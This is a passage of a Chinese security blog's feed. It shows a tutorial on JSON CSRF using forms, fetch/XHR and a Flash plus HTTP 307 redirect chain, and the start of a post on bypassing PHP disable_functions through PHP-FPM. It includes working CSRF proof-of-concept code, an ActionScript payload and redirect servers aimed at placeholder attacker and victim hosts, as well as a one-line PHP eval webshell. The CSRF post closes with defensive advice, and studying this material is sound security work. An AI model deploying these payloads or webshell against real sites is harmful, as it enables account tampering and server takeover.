rel="noopener">https://book.2cto.com/201310/34314.html。</a></p><h2 id="0x09-Flash安全测试工具"><a href="#0x09-Flash安全测试工具" class="headerlink" title="0x09 Flash安全测试工具"></a>0x09 Flash安全测试工具</h2><p>OWASP推荐了一款名为SWFIntruder的测试工具，具体可参见OWASP链接：<a href="https://www.owasp.org/index.php/Category:SWFIntruder" target="_blank" rel="noopener">https://www.owasp.org/index.php/Category:SWFIntruder</a></p><h2 id="0x0A-参考"><a href="#0x0A-参考" class="headerlink" title="0x0A 参考"></a>0x0A 参考</h2><p><a href="https://www.owasp.org/images/2/2d/FLASH_Security.pdf" target="_blank" rel="noopener">FLASH_Security_OWASP</a></p><p>《XSS跨站脚本攻击剖析与防御》</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Flash" scheme="https://www.mi1k7ea.com/tags/Flash/"/>
    
  </entry>
  
  <entry>
    <title>利用Flash进行Json CSRF攻击</title>
    <link href="https://www.mi1k7ea.com/2019/08/05/%E5%88%A9%E7%94%A8Flash%E8%BF%9B%E8%A1%8CJson-CSRF%E6%94%BB%E5%87%BB/"/>
    <id>https://www.mi1k7ea.com/2019/08/05/利用Flash进行Json-CSRF攻击/</id>
    <published>2019-08-05T13:47:34.000Z</published>
    <updated>2019-08-10T01:54:02.578Z</updated>
    
    <content type="html"><![CDATA[<p>这时很早以前的话题了，整理一下原理和工具脚本等，以作为笔记。</p><h2 id="0x01-CSRF与Json-CSRF"><a href="#0x01-CSRF与Json-CSRF" class="headerlink" title="0x01 CSRF与Json CSRF"></a>0x01 CSRF与Json CSRF</h2><p>一般的，我们说CSRF都是在GET/POST请求中通过构造HTML表单如param=value来提交给服务器，服务器得到数据并处理请求；而Json CSRF则是提交Json格式的数据。</p><p>相比之下，提交Json格式的数据，这种请求包更难构造，因为表单无法伪造Content-Type字段、无法提交格式正确的Json数据，因此需要利用其它技术组合利用。</p><p>当然，两者的漏洞存在的前提是一样的，即无CSRF token。</p><h2 id="0x02-Json-CSRF的几种情形"><a href="#0x02-Json-CSRF的几种情形" class="headerlink" title="0x02 Json CSRF的几种情形"></a>0x02 Json CSRF的几种情形</h2><h3 id="未校验Content-Type字段和Json数据格式"><a href="#未校验Content-Type字段和Json数据格式" class="headerlink" title="未校验Content-Type字段和Json数据格式"></a>未校验Content-Type字段和Json数据格式</h3><p>此时直接使用Burpsuite生成的CSRF PoC即可利用，这里我们可以明显地看到Json数据最后会带上=号，因此也正是服务端未校验Json数据格式才能成功。</p><p>这里假设某站点Json端点通过POST方式提交Json数据，该接口用于添加新用户和邮箱，我们用Burpsuite抓包然后生成PoC如下，当然实际生成的情况中提交数据的特殊字符会被编码掉：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSON CSRF POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> JSON CSRF POC <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">http://vul-app.com</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"name":"attacker","email":"attacker@gmail.com","ignore_me":"test"&#125;'</span> <span class="attr">value</span>=<span class="string">''</span><span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而发送的POST请求包大致如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vul-app.com</span><br><span class="line">...</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;attacker&quot;,&quot;email&quot;:&quot;attacker@gmail.com&quot;,&quot;ignore_me&quot;:&quot;test&quot;&#125;=</span><br></pre></td></tr></table></figure><p>可以看到，Content-Type字段为text/plain，Json数据最后会多出个=号，那是因为Json数据放在了input标签中name属性值中，而input标签的value属性为空，表单提交时是会以name=value的形式提交的。</p><p>缺点：无法伪造Content-Type字段；不校验Json数据格式。</p><h3 id="未校验Content-Type字段，校验Json数据格式但最后的Json键值可填入-号"><a href="#未校验Content-Type字段，校验Json数据格式但最后的Json键值可填入-号" class="headerlink" title="未校验Content-Type字段，校验Json数据格式但最后的Json键值可填入=号"></a>未校验Content-Type字段，校验Json数据格式但最后的Json键值可填入=号</h3><p>此时需要稍微改下前面的表单PoC，在input标签的value处写上相应的值来使Json数据格式正确：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSON CSRF POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> JSON CSRF POC <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">http://vul-app.com</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"name":"attacker","email":"attacker@gmail.com","ignore_me":"'</span> <span class="attr">value</span>=<span class="string">'test"&#125;'</span><span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在POST的请求体中，看到Content-Type字段依然为text/plain，但Json数据最后并无=号，而是在Json数据中最后的键值对的值中前面多了个=号，这时闭合构造的结果：</p><p><img src="/2019/08/05/利用Flash进行Json-CSRF攻击/2.png" alt=""></p><p>缺点：无法伪造Content-Type字段；Json数据值可带=号。</p><h3 id="校验Content-Type字段和Json数据格式，允许跨域OPTIONS"><a href="#校验Content-Type字段和Json数据格式，允许跨域OPTIONS" class="headerlink" title="校验Content-Type字段和Json数据格式，允许跨域OPTIONS"></a>校验Content-Type字段和Json数据格式，允许跨域OPTIONS</h3><p>如果校验了Content-Type字段必须为application/json的话，前面两种方式都不行了。</p><p>当跨域请求为复杂请求时，浏览器会发送OPTIONS请求，用来让服务端返回允许的方法（如GET、POST），允许被跨域访问的Origin（来源或者域），还有是否需要Credentials（认证信息）等。</p><p>下面使用Fetch和XHR方法的前提都是要发起OPTIONS请求来进行预检，之后才是真正地发送Json数据包。</p><p><strong>Fetch</strong></p><p>使用JS的Fetch()方法可以解决Content-Type字段的问题：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    fetch(<span class="string">'http://vul-app.com'</span>, &#123;method: <span class="string">'POST'</span>, credentials: <span class="string">'include'</span>, headers: &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json; charset=utf-8'</span>&#125;, body: <span class="string">'&#123;"name":"attacker","email":"attacker@gmail.com","ignore_me":"test"&#125;'</span>&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>抓包可看到会先发送OPTIONS请求，再发送真正的请求；在请求中Content-Type字段为application/json，Json数据也是正确的格式。</p><p>缺点：跨域发送OPTIONS请求。</p><p><strong>XHR</strong></p><p>使用XMLHttpRequest可以解决Content-Type字段的问题：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">      <span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span><span class="params">()</span></span></span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">        xhr.open(<span class="string">"POST"</span>, <span class="string">"http://vul-app.com"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"*/*"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept-Language"</span>, <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/json; charset=utf-8"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.withCredentials = <span class="literal">true</span>; <span class="comment">//携带cookie</span></span></span><br><span class="line"><span class="javascript">    xhr.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="string">"name"</span>:<span class="string">"attacker"</span>,<span class="string">"email"</span>:<span class="string">"attacker@gmail.com"</span>,<span class="string">"ignore_me"</span>:<span class="string">"test"</span>&#125;));</span></span><br><span class="line"><span class="undefined">     &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> <span class="attr">onclick</span>=<span class="string">"submitRequest();"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>抓包可看到会先发送OPTIONS请求，再发送真正的请求；在请求中Content-Type字段为application/json，Json数据也是正确的格式。</p><p>缺点：跨域发送OPTIONS请求。</p><h3 id="校验Content-Type字段和Json数据格式"><a href="#校验Content-Type字段和Json数据格式" class="headerlink" title="校验Content-Type字段和Json数据格式"></a>校验Content-Type字段和Json数据格式</h3><p>此时便需要用到Flash + HTTP 307技巧来实现利用了，在下一节说明。</p><h2 id="0x03-Flash-HTTP-307"><a href="#0x03-Flash-HTTP-307" class="headerlink" title="0x03 Flash + HTTP 307"></a>0x03 Flash + HTTP 307</h2><p>个人理解的公式：<strong>无CSRF token + Flash + HTTP 307 = Json CSRF</strong></p><p>解决了哪些问题：</p><ul><li>Flash可以自定义Header请求，从而伪造Content-Type字段；</li><li>HTTP 307和其他3xx HTTP状态码不同之处在于，307可以确保重定向请求发送之后，请求的方法和请求主体不会发生任何改变，会原封不动地转发出去；</li><li>Flash访问同域或存在crossdomain.xml允许的服务器的307跳转文件可避免Flash跨域访问时必须要求目标站点存在crossdomain.xml且配置允许的特定情况；</li></ul><h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><p>目标Json端点无CSRF token机制，其所能接收的Header的Content-Type必须为application/json，且严格校验了Json格式数据。</p><h3 id="关键文件"><a href="#关键文件" class="headerlink" title="关键文件"></a>关键文件</h3><p>在发起攻击前，需要我们准备好几个关键的文件。</p><p><strong>Flash文件</strong></p><p>第一个是用于向307文件发起请求的诱使用户访问的Flash的swf文件，作用就是构造Json数据，伪造Content-Type字段并访问攻击者控制的服务器的307文件，至于as文件如何编译看下Flash XSS相关文章即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">  import flash.display.Sprite;</span><br><span class="line">  import flash.net.URLLoader;</span><br><span class="line">  import flash.net.URLRequest;</span><br><span class="line">  import flash.net.URLRequestHeader;</span><br><span class="line">  import flash.net.URLRequestMethod;</span><br><span class="line">public class csrf extends Sprite</span><br><span class="line">  &#123;</span><br><span class="line">    public function csrf()</span><br><span class="line">    &#123;</span><br><span class="line">      super();</span><br><span class="line">      var member1:Object = null;</span><br><span class="line">      var myJson:String = null;</span><br><span class="line">      member1 = new Object();</span><br><span class="line">      member1 = &#123;</span><br><span class="line">          &quot;acctnum&quot;:&quot;100&quot;,</span><br><span class="line">          &quot;confirm&quot;:&quot;true&quot;</span><br><span class="line">      &#125;;</span><br><span class="line">      var myData:Object = member1;</span><br><span class="line">      myJson = JSON.stringify(myData);</span><br><span class="line">      var url:String = &quot;http://attacker-ip:8000/&quot;;</span><br><span class="line">      var request:URLRequest = new URLRequest(url);</span><br><span class="line">      request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;));</span><br><span class="line">      request.data = myJson;</span><br><span class="line">      request.method = URLRequestMethod.POST;</span><br><span class="line">      var urlLoader:URLLoader = new URLLoader();</span><br><span class="line">try</span><br><span class="line">      &#123;</span><br><span class="line">          urlLoader.load(request);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">      catch(e:Error)</span><br><span class="line">      &#123;</span><br><span class="line">          trace(e);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实现307跳转功能的文件</strong></p><p>该文件放置于攻击者控制的服务器上，可与Flash文件放置在同一服务上，可用PHP或Python实现。</p><p>PHP实现307跳转的代码，简单粗暴：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: "</span>.$_GET[<span class="string">"endpoint"</span>], <span class="keyword">true</span>, <span class="number">307</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Python实现的代码，基于BaseHTTPServer实现的，用于和Flash文件放置在同一个Web服务：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> BaseHTTPServer</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">''</span> </span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedirectHandler</span><span class="params">(BaseHTTPServer.BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_POST</span><span class="params">(s)</span>:</span></span><br><span class="line">       <span class="comment"># dir(s)</span></span><br><span class="line">        <span class="keyword">if</span> s.path == <span class="string">'/csrf.swf'</span>:</span><br><span class="line">           s.send_response(<span class="number">200</span>)</span><br><span class="line">           s.send_header(<span class="string">"Content-Type"</span>,<span class="string">"application/x-shockwave-flash"</span>)</span><br><span class="line">           s.end_headers()</span><br><span class="line">           s.wfile.write(open(<span class="string">"csrf.swf"</span>, <span class="string">"rb"</span>).read())</span><br><span class="line">           <span class="keyword">return</span> </span><br><span class="line">        s.send_response(<span class="number">307</span>)</span><br><span class="line">        s.send_header(<span class="string">"Location"</span>, <span class="string">"https://victim-site/userdelete"</span>)</span><br><span class="line">        s.end_headers()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(s)</span>:</span></span><br><span class="line">        print(s.path)</span><br><span class="line">        s.do_POST()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server_class = BaseHTTPServer.HTTPServer</span><br><span class="line">    httpd = server_class((HOST, PORT), RedirectHandler)</span><br><span class="line">    <span class="keyword">print</span> time.asctime(), <span class="string">"Server Starts - %s:%s"</span> % (HOST, PORT)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    httpd.server_close()</span><br><span class="line">    <span class="keyword">print</span> time.asctime(), <span class="string">"Server Stops - %s:%s"</span> % (HOST, PORT)</span><br></pre></td></tr></table></figure><p><strong>crossdomain.xml</strong></p><p>这个文件是否需要看情况：当Flash文件和307跳转文件同域，则无需该文件；若两个文件不同域，为了使Flash文件能够成功跨域访问，则需要攻击者在307跳转文件所在的Web服务器上放置crossdomain.xml并设置允许Flash文件所在的域能够访问，如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*"</span> <span class="attr">secure</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-http-request-headers-from</span> <span class="attr">domain</span>=<span class="string">"*"</span> <span class="attr">headers</span>=<span class="string">"*"</span> <span class="attr">secure</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>借个FreeBuf上的图：</p><p><img src="/2019/08/05/利用Flash进行Json-CSRF攻击/1.png" alt=""></p><ol><li><p>用户在浏览器中登录<code>http://victim-site/</code></p></li><li><p>用户被重定向到<code>http://attacker-ip:8000/csrf.swf</code></p></li><li><p>Flash文件加载成功，并向<code>http://attacker-ip:8000/</code>发送带有自定义Header的POST Payload。</p></li><li><p>攻击者的服务器发送HTTP 307重定向，这样便能让POST响应body和自定义HTTP头按原样发送到<code>http://victim-site/</code></p></li><li><p>目标用户刷新自己的<code>http://victim-site/</code>页面，并发现自己的帐户已经被删除了</p></li></ol><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>可参考：<a href="http://www.0xby.com/902.html" target="_blank" rel="noopener">http://www.0xby.com/902.html</a></p><h2 id="0x04-工具"><a href="#0x04-工具" class="headerlink" title="0x04 工具"></a>0x04 工具</h2><p>现成美好的轮子已经很多了，无需我们自己再造了，下面是个人收集的两个。</p><p>Python起的Web服务，包括307文件都在一个Web服务中，理解原理可参考这个构造payload：</p><p><a href="https://github.com/appsecco/json-flash-csrf-poc" target="_blank" rel="noopener">https://github.com/appsecco/json-flash-csrf-poc</a></p><p>更全面的工具，包括显示界面等HTML文件，PHP文件实现的307跳转功能：</p><p><a href="https://github.com/sp1d3r/swf_json_csrf/" target="_blank" rel="noopener">https://github.com/sp1d3r/swf_json_csrf/</a></p><h2 id="0x05-防御方法"><a href="#0x05-防御方法" class="headerlink" title="0x05 防御方法"></a>0x05 防御方法</h2><p>Json CSRF还是CSRF漏洞，采用CSRF通用防御即可成功防御。</p><p>主要有 5 种策略：验证 HTTP的Referer字段、在请求地址中添加 token 并验证、在 HTTP 头中自定义属性并验证、使用POST替代GET等。</p><p>（1）、验证 HTTP的Referer字段，在 HTTP 头的Referer字段记录了该 HTTP 请求的来源地址。顺便解决了非法盗链、站外提交等问题。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。</p><p>（2）、在请求地址中添加 token 并验证，可以在 HTTP请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。抵御 CSRF 攻击的关键在于：在请求中加入攻击者所不能伪造的信息，并且该信息不存在于 Cookie 之中。</p><p>（3）、在 HTTP 头中自定义属性并验证，也是使用 token 并进行验证，但并不是把 token以参数的形式置于 HTTP 请求而是放到 HTTP 头中自定义的属性里。通过XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把token 值放入其中。这样解决了前一种方法在请求中加入 token 的不便，同时，通过这个类请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会通过 Referer 泄露到其他网站。</p><p>（4）、严格区分好 POST 与 GET 的数据请求，尽量使用POST来替代GET，如在 asp 中不要使用 Request 来直接获取数据。同时建议不要用 GET 请求来执行持久性操作。</p><p>（5）、使用验证码或者密码确认方式，缺点是用户体验差。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://www.freebuf.com/articles/web/164234.html" target="_blank" rel="noopener">如何在JSON端点上利用CSRF漏洞</a></p><p><a href="https://mp.weixin.qq.com/s/0X6-d5Wbv8Ps3pGJpX6FAQ" target="_blank" rel="noopener">通过挖掘某某 src 来学习 json csrf</a></p><p><a href="https://toutiao.io/posts/7zwnbs/preview" target="_blank" rel="noopener">[译] 使用 Flash 进行 JSON CSRF 攻击</a></p><p><a href="http://www.0xby.com/902.html" target="_blank" rel="noopener">JSON CSRF的一个案例-附利用链接</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Flash" scheme="https://www.mi1k7ea.com/tags/Flash/"/>
    
      <category term="CSRF" scheme="https://www.mi1k7ea.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>从蚁剑插件看利用PHP-FPM绕过disable_functions</title>
    <link href="https://www.mi1k7ea.com/2019/08/03/%E4%BB%8E%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E7%9C%8B%E5%88%A9%E7%94%A8PHP-FPM%E7%BB%95%E8%BF%87disable-functions/"/>
    <id>https://www.mi1k7ea.com/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/</id>
    <published>2019-08-03T04:11:46.000Z</published>
    <updated>2019-08-04T15:01:48.701Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-环境准备与插件使用"><a href="#0x01-环境准备与插件使用" class="headerlink" title="0x01 环境准备与插件使用"></a>0x01 环境准备与插件使用</h2><p>这是蚁剑上的一个disable_functions项目：<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5" target="_blank" rel="noopener">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5</a></p><p>Docker部署非常方便，文档也说明了如何用蚁剑的插件来Bypass disable_functions。本次示例的插件适用于PHP-FPM/FCGI 监听在 unix socket 或者 tcp socket 上时使用。常见的比如：nginx + fpm。</p><p>题目直接就是个WebShell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_REQUEST[<span class="string">'ant'</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看phpinfo，看到服务器中PHP是用FPM/FastCGI的连接模式启动的：</p><p><img src="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/6.png" alt=""></p><p>其中open_basedir未设置，而disable_functions设置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv</span><br></pre></td></tr></table></figure><p>可看到，命令执行函数、mail()、putenv()、dl()等经常用来绕过disable_functions的函数都被禁用掉了。</p><p>用蚁剑直接连接看看，Web根目录下有两个php，代码是一样的：</p><p><img src="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/1.png" alt=""></p><p>切到虚拟终端，命令执行不成功：</p><p><img src="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/2.png" alt=""></p><p>后面就添加插件再试试。先去插件市场下载安装绕过disable_functions插件，然后加载进来，选择PHP-FPM/FastCGI模式进行，FPM地址根据需要自行查找配置文件，然后点击开始即可：</p><p><img src="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/3.png" alt=""></p><p>操作成功后，会显示成功上传代理脚本和一个so文件，在Web根目录下会多了个.antproxy.php文件，我们添加副本改为该代理PHP文件即可成功Bypass disable_functions：</p><p><img src="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/4.png" alt=""></p><p><img src="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/5.png" alt=""></p><p>下面我们探究下这个插件的原理。</p><h2 id="0x02-原理分析"><a href="#0x02-原理分析" 